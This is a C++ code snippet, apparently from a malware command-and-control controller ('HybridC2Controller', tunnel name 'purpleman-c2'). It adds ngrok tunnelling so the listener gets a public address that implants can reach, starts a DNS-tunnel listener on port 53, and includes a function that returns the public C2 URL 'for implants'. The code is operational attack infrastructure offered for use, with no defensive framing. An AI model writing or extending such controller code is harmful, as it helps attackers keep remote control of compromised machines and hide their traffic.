// =============================================================================
// NGROK INTEGRATION FOR C2 CONTROLLER
// =============================================================================
// Add this to c2_contoller.cpp in the HybridC2Controller class

#include "network/ngrok_client.h"

private:
    std::unique_ptr<NgrokClient> ngrokClient;
    bool useNgrokTunnel = false;
    std::string ngrokPublicURL;
    
    // =========================================================================
    // NGROK TUNNEL MANAGEMENT
    // =========================================================================
    
    bool InitializeNgrokTunnel() {
        std::cout << "[*] Initializing ngrok tunnel..." << std::endl;
        
        try {
            // Create ngrok client
            ngrokClient = std::make_unique<NgrokClient>("", "127.0.0.1", config.bindPort);
            
            if (!ngrokClient->Initialize()) {
                logger::Error("Failed to initialize ngrok client");
                std::cout << "[!] ngrok not running. Start ngrok with: ngrok tcp " << config.bindPort << std::endl;
                return false;
            }
            
            // Create TCP tunnel
            if (!ngrokClient->CreateTCPTunnel("purpleman-c2")) {
                logger::Error("Failed to create ngrok tunnel");
                return false;
            }
            
            // Get public URL
            ngrokPublicURL = ngrokClient->GetPublicURL("purpleman-c2");
            if (ngrokPublicURL.empty()) {
                logger::Error("Failed to get ngrok public URL");
                return false;
            }
            
            std::cout << "[+] Ngrok tunnel created: " << ngrokPublicURL << std::endl;
            logger::Info("Ngrok tunnel: " + ngrokPublicURL);
            
            useNgrokTunnel = true;
            return true;
        } catch (const std::exception& e) {
            logger::Error("Ngrok initialization error: " + std::string(e.what()));
            return false;
        }
    }
    
    void DisplayNgrokStatus() {
        if (!useNgrokTunnel) {
            std::cout << "[-] Ngrok tunnel not initialized" << std::endl;
            return;
        }
        
        std::cout << "\n╔════════════════════════════════════════╗" << std::endl;
        std::cout << "║      NGROK TUNNEL STATUS               ║" << std::endl;
        std::cout << "╠════════════════════════════════════════╣" << std::endl;
        std::cout << "║ Public URL: " << ngrokPublicURL << std::endl;
        std::cout << "║ Local Bind: " << config.bindAddress << ":" << config.bindPort << std::endl;
        std::cout << "║ Status: " << (useNgrokTunnel ? "ACTIVE" : "INACTIVE") << std::endl;
        std::cout << "╚════════════════════════════════════════╝" << std::endl;
    }
    
    void StopNgrokTunnel() {
        if (ngrokClient) {
            ngrokClient->StopAllTunnels();
            std::cout << "[+] Ngrok tunnels stopped" << std::endl;
            logger::Info("Ngrok tunnels stopped");
        }
        useNgrokTunnel = false;
    }

public:
    // Modified Initialize method with ngrok support
    bool InitializeWithNgrok(bool enableNgrok = false) {
        std::cout << "\n[*] Initializing Hybrid C2 Controller...\n" << std::endl;
        config.Load("c2_config.json");
        
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "[!] WSAStartup failed" << std::endl;
            return false;
        }
        
        tcpListener = netMgr.CreateTCPSocket();
        if (tcpListener == INVALID_SOCKET) {
            std::cerr << "[!] Failed to create TCP socket" << std::endl;
            return false;
        }
        
        if (!netMgr.BindAndListen(tcpListener, config.bindAddress, config.bindPort)) {
            std::cerr << "[!] Bind/listen failed on port " << config.bindPort << std::endl;
            closesocket(tcpListener);
            WSACleanup();
            return false;
        }
        
        std::cout << "[+] TCP Listener started on " << config.bindAddress << ":" << config.bindPort << std::endl;
        
        // Initialize ngrok if requested
        if (enableNgrok) {
            if (!InitializeNgrokTunnel()) {
                std::cout << "[!] Warning: Ngrok tunnel failed, continuing without it" << std::endl;
            }
        }
        
        udpSocket = netMgr.CreateUDPSocket(53);
        if (udpSocket != INVALID_SOCKET) {
            std::cout << "[+] DNS Tunnel listener started on port 53" << std::endl;
        }
        
        if (usbMgr.IsAutoDetectEnabled()) {
            usbMgr.DetectAuthorizedUSB();
        }
        
        return true;
    }
    
    // Get ngrok public URL for implants
    std::string GetPublicC2URL() {
        if (useNgrokTunnel && !ngrokPublicURL.empty()) {
            return ngrokPublicURL;
        }
        return "";
    }

